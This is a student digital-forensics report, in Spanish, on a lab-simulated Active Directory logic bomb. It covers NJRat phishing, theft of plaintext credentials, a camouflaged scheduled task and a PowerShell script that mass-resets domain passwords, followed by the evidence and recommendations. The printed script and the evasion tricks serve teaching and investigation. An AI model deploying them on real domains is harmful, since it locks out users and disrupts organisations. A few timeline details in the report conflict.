# Informe de Investigación Forense Digital
### Caso No. 2026-001 — "Bomba Lógica en Entorno de Active Directory"

| Campo | Detalle |
|---|---|
| Empresa afectada | Path Secure SRL |
| Dominio AD | `pathsecure.local` |
| Fecha del incidente | 23 de abril de 2026 — 5:13 AM |
| Fecha del informe | 23 de abril de 2026 |
| Curso | Informática Forense — Grupo 6 |
| Clasificación | CONFIDENCIAL |

**Instituto Tecnológico de las Américas (ITLA)**  
Profesor: Cándido Noel Ramírez

**Equipo Investigador**

| Investigador | Matrícula | Rol |
|---|---|---|
| Branyel Pérez | 2024-1489 | Perito Forense Digital |
| Francis Vidal | 2024-1183 | Perito Forense Digital |
| Elian Leonardo | 2023-0961 | Perito Forense Digital |

---

## 1. Resumen Ejecutivo

El día 23 de abril de 2026, la empresa Path Secure SRL sufrió un incidente de seguridad crítico que resultó en la **paralización total de las operaciones** debido al compromiso masivo de credenciales en el entorno de Active Directory.

A las 8:10 PM del día 22 de abril de 2026, la usuaria **Ana Pérez** (Departamento de Recursos Humanos) recibió un correo fraudulento suplantando al departamento interno de RRHH. Usando técnicas de ingeniería social y **spear phishing**, el correo prometía un ajuste salarial e instaba a abrir el adjunto `Nomina_RRHH_Q2_2026.pdf`, que en realidad contenía el troyano de acceso remoto **NJRat v0.7d**.

Una vez activo, el atacante estableció un canal C2 por el **puerto 1177/TCP**. Localizó el archivo `passwords_temporal.txt` con credenciales administrativas en texto plano, escaló privilegios al Domain Controller e implantó una bomba lógica: el script PowerShell `svchost_helper.ps1` activado por la tarea programada `WindowsUpdateHelper`.

A las **5:13 AM del 23 de abril**, la bomba lógica detonó, cambiando simultáneamente las contraseñas de todos los usuarios del dominio (`carlos.mendez`, `ana.perez`, `luis.gomez`) y dejando a la totalidad de los empleados sin acceso a los sistemas corporativos.

---

## 2. Información del Caso

| Campo | Detalle |
|---|---|
| Número de caso | 2026-001 |
| Tipo de incidente | Bomba Lógica / Compromiso de Active Directory |
| Severidad | CRÍTICA |
| Sistema afectado | Windows Server 2022 — Domain Controller |
| Dominio | `pathsecure.local` |
| IP del servidor | `10.0.0.4` (Azure — East US) |
| Sistema atacante | Windows 10 — Azure East US |
| Vector de ataque | Phishing por correo electrónico (Spear Phishing) |
| Malware utilizado | NJRat v0.7d — Puerto C2: 1177/TCP |
| Herramienta de persistencia | Scheduled Task: `WindowsUpdateHelper` |
| Script malicioso | `C:\Windows\System32\svchost_helper.ps1` |

> **Infraestructura:** El laboratorio fue desplegado íntegramente en **Microsoft Azure (East US)** con dos máquinas virtuales — `windows-server` (Windows Server 2022, Domain Controller víctima) y `windows-10` (Windows 10, estación atacante).

---

## 3. Cronología del Incidente

| Fecha / Hora | Evento |
|---|---|
| 22/04/2026 — 8:10 PM | Ana Pérez recibe correo con nómina falsa que contiene el troyano |
| 23/04/2026 — 4:15 AM | El troyano se activa y establece beacon hacia el C2 (puerto 1177/TCP) |
| 23/04/2026 — 4:27 AM | Atacante obtiene acceso remoto al equipo de Ana Pérez vía NJRat |
| 23/04/2026 — 4:40 AM | Atacante usa File Manager de NJRat y localiza `passwords_temporal.txt` con credenciales `admin.it : P@ssw0rdAdmin2024` |
| 23/04/2026 — 4:50 AM | Atacante usa keylogger de NJRat y captura credenciales adicionales |
| 23/04/2026 — 4:58 AM | Atacante accede al Domain Controller vía RDP con credenciales `admin.it` — escalada de privilegios exitosa |
| 23/04/2026 — 5:05 AM | Atacante crea `svchost_helper.ps1` en `C:\Windows\System32\` y la tarea programada `WindowsUpdateHelper` |
| 23/04/2026 — **5:13 AM** | **DETONACIÓN:** Bomba lógica ejecuta script. Contraseñas de todos los usuarios del AD cambiadas simultáneamente |
| 23/04/2026 — 8:05 AM | Empleados intentan iniciar sesión — acceso denegado. Paralización total de la organización |
| 23/04/2026 — 9:00 AM | Inicio de respuesta al incidente. Levantamiento forense con FTK Imager, Autoruns, Process Explorer y Event Viewer |

---

## 4. Metodología del Ataque

### 4.1 Vector de Entrada — Spear Phishing

El atacante envió un correo fraudulento desde `rrhh.pathsecure@gmail.com` suplantando al Departamento de RRHH de Path Secure SRL. El adjunto `Nomina_RRHH_Q2_2026.pdf.exe` era el troyano NJRat v0.7d disfrazado con doble extensión e ícono de PDF, distribuido en un `.zip` con contraseña `1234` para evadir filtros de correo.

### 4.2 Instalación del Troyano — NJRat v0.7d

NJRat (Njw0rm) es un Remote Access Trojan (RAT) ampliamente utilizado en ataques dirigidos. Una vez ejecutado:

- Se copió en `%APPDATA%\Roaming\` con nombre aleatorio
- Agregó entrada de registro para persistencia en el arranque
- Estableció conexión C2 saliente por el **puerto 1177/TCP**
- Activó **keylogger integrado** para captura de credenciales
- Habilitó **File Manager** para acceso completo al sistema de archivos

### 4.3 Movimiento Lateral — Escalada de Privilegios

A través del File Manager de NJRat, el atacante localizó en el escritorio del servidor el archivo `passwords_temporal.txt` con credenciales administrativas en texto plano:

```
admin.it : P@ssw0rdAdmin2024
```

Con estas credenciales estableció una sesión **RDP directa al Domain Controller** (`pathsecure.local`) con privilegios de Domain Admin, completando la escalada de privilegios.

### 4.4 Implantación de la Bomba Lógica

Con acceso privilegiado al DC, el atacante creó el script PowerShell camuflado:

```powershell
# C:\Windows\System32\svchost_helper.ps1
Import-Module ActiveDirectory
$usuarios = @("ana.perez", "carlos.mendez", "luis.gomez")
$nuevaPass = ConvertTo-SecureString "Locked2026!" -AsPlainText -Force
foreach ($u in $usuarios) {
    Set-ADAccountPassword -Identity $u -NewPassword $nuevaPass -Reset
}
```

Y registró la tarea programada:

| Parámetro | Valor |
|---|---|
| Nombre | `WindowsUpdateHelper` (camufla como tarea legítima de Windows) |
| Script | `C:\Windows\System32\svchost_helper.ps1` |
| Cuenta | `SYSTEM` |
| Política | `ExecutionPolicy Bypass` |
| Hora de detonación | 5:13 AM — 23/04/2026 |

---

## 5. Evidencia Forense Recolectada

### 5.1 FTK Imager — Preservación de Evidencia Digital

Se utilizó **FTK Imager 4.7.3.81** como primera herramienta, siguiendo el principio fundamental: *preservar antes de analizar*. Se realizaron dos capturas: volcado de memoria RAM y creación de imagen forense del disco completo.

**Volcado de memoria RAM**
- Destino: `C:\Users\Public\memoria_ram.mem`
- Tamaño: 94 GB

**Imagen forense del disco**
- Origen: `C:\` · Destino: `E:\imagen_disco` (unidad forense asignada desde Azure)
- Formato: E01

**Metadata del caso registrada antes de la imagen:**

| Campo | Valor |
|---|---|
| Case Number | 2026-001 |
| Evidence Number | 001 |
| Unique Description | Servidor PathSecure - Bomba Lógica |
| Examiner | Branyel, Francis, Elian |

**Verificación de integridad — resultado MATCH en ambos algoritmos:**

| Algoritmo | Hash | Resultado |
|---|---|---|
| MD5 | `9ff28a94e47dfa529faf4c37f23a0d83` | ✅ MATCH |
| SHA1 | `6343b0e37c873f564b728860d726fa1103e47196` | ✅ MATCH |
| Bad Blocks | — | Sin bad blocks en la imagen |

### 5.2 HashCalc — Verificación Independiente del Volcado de RAM

Verificación independiente de integridad del volcado de memoria para confirmar la cadena de custodia:

| Algoritmo | Hash del volcado RAM |
|---|---|
| MD5 | `0b0c8d77c430517fce4e50dc6f7cef9d` |
| SHA1 | `1bc79849f5e82fc267bcd3be8f3c5f17f7cf3e7b` |

### 5.3 Autoruns — Detección de Persistencia Maliciosa

Autoruns identificó la tarea programada maliciosa `WindowsUpdateHelper` ejecutando `PowerShell.exe` con `ExecutionPolicy Bypass` sobre `svchost_helper.ps1`. La tarea fue diseñada con nombre similar a `WindowsUpdate` para mimetizarse con procesos legítimos del OS.

### 5.4 Process Explorer — Análisis de Procesos en Memoria

Process Explorer reveló un proceso `svchost.exe` con comportamiento anómalo:

| Indicador | Detalle |
|---|---|
| PID | 4320 |
| Path | Acceso denegado — no verificable |
| Versión de archivo | Sin información |
| Autostart Location | No registrado |
| Hora de inicio | 8:04 PM (coincide con activación C2) |

La combinación de acceso denegado a la ruta, ausencia de metadata de versión y falta de Autostart Location son indicadores claros de un proceso malicioso activo.

### 5.5 Event Viewer — Evidencia Directa de Detonación

Los logs de seguridad del Domain Controller registraron el **Event ID 4724** (An attempt was made to reset an account's password) para cada usuario, todos con timestamp idéntico:

| Campo | Valor |
|---|---|
| Event ID | **4724** — Password Reset |
| Timestamp | **4/23/2026 — 5:13:03 AM** (idéntico en todos los usuarios) |
| Sujeto ejecutor | `PATHSECURE\branyel` — Logon ID `0x63C68E` |
| Usuarios afectados | `ana.perez`, `carlos.mendez`, `luis.gomez` |
| Equipo | `windows-server.pathsecure.local` |
| Task Category | User Account Management |
| Keywords | **Audit Success** |

> El timestamp idéntico en los tres eventos confirma la ejecución automática y simultánea del script por la tarea `WindowsUpdateHelper`.

---

## 6. Resumen de Evidencias

| # | Herramienta | Hallazgo | Relevancia Forense |
|---|---|---|---|
| E-01 | FTK Imager | Imagen E01 del disco + volcado RAM. Hashes MD5/SHA1: MATCH | Preservación íntegra. Garantiza que el contenido no fue alterado post-incidente |
| E-02 | Autoruns | Tarea `WindowsUpdateHelper` ejecutando PowerShell con `ExecutionPolicy Bypass` sobre `svchost_helper.ps1` | Confirma mecanismo de persistencia y detonación de la bomba lógica |
| E-03 | Process Explorer | `svchost.exe` PID 4320 con path denegado, sin versión, sin Autostart — iniciado 8:04 PM | Indica proceso malicioso activo durante el incidente |
| E-04 | Event Viewer | Event ID 4724 para `ana.perez`, `luis.gomez`, `carlos.mendez` a las 5:13:03 AM | Evidencia directa e irrefutable de la detonación y cambio masivo de contraseñas |
| E-05 | HashCalc | MD5 y SHA1 calculados de forma independiente para `memoria_ram.mem` | Cadena de custodia: confirma que la imagen de RAM no fue modificada durante el análisis |

---

## 7. Conclusiones

1. **Phishing como vector inicial** — El atacante usó ingeniería social con un correo de alta credibilidad explotando la confianza en comunicaciones internas de RRHH.
2. **RAT para acceso persistente** — NJRat proporcionó acceso remoto total: keylogger, file manager y shell remoto sobre el equipo comprometido.
3. **Error humano crítico** — El almacenamiento de credenciales administrativas en texto plano (`passwords_temporal.txt`) fue el factor decisivo que permitió la escalada al Domain Controller. Constituye una violación grave de políticas de seguridad.
4. **Bomba lógica efectiva** — La combinación de un script PowerShell camuflado y una Scheduled Task con nombre legítimo resultó en una ejecución exitosa sin detección previa.
5. **Impacto total calculado** — La detonación a las 5:13 AM garantizó la interrupción máxima al coincidir con el inicio de la jornada laboral.

### 7.1 Recomendaciones

- Implementar **MFA** para todos los accesos administrativos al dominio
- **Prohibir credenciales en texto plano** — implementar gestor de contraseñas corporativo
- **Capacitar empleados** en identificación de correos phishing y spear phishing
- Implementar **Group Policy** para restringir ejecución de scripts PowerShell no firmados
- **Activar auditoría completa** en el Domain Controller desde el inicio del sistema
- Implementar **SIEM** para detección de comportamiento anómalo en tiempo real
- **Auditar Scheduled Tasks** periódicamente para detectar tareas no autorizadas
- **Segmentar la red** para limitar el movimiento lateral ante compromiso de una estación de trabajo

---

## 8. Firmas del Equipo Investigador

| Investigador | Matrícula | Firma |
|---|---|---|
| Branyel Pérez | 2024-1489 | ________________________ |
| Francis Vidal | 2024-1183 | ________________________ |
| Elian Leonardo | 2023-0961 | ________________________ |

*Santo Domingo, República Dominicana — 23 de abril de 2026*  
*ITLA — Informática Forense*
